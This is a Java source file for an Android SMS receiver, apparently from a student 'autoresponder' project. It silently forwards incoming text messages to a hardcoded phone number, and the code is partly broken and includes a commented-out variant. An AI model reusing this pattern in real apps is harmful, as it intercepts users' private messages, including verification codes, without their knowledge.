package com.seniordesign.autoresponder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.*;
import android.telephony.SmsMessage;

public class EventListener extends BroadcastReceiver{
    @Override
    public void onReceive(Context context, Intent intent)
    {
        /*Method 1
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                android.util.Log.v("AutoResponder is ", java.lang.Boolean.toString(checked));
                String messageBody = smsMessage.getMessageBody();
                SmsManager sms = SmsManager.getDefault();
                sms.sendTextMessage("8568327320", null, messageBody, null, null);
            }
        }*/



        //Method 2
       // if (intent.getAction().equals(android.telephony.SMS_RECEIVED)) {
            android.util.Log.v("SMSForward,", "Intent received: " + intent.getAction());
            String message = "Thunder";
            Bundle bundle = intent.getExtras();

            Object[] messages = (Object[]) bundle.get("pdus");
            if (messages != null) {
                SmsMessage[] sms = new SmsMessage[messages.length];
                for (int n = 0; n < messages.length; n++) {
                    sms[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
                    message += sms[n];
                }
            }

            //Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage("18568327320", null, message, null, null);
       // }
    }

}
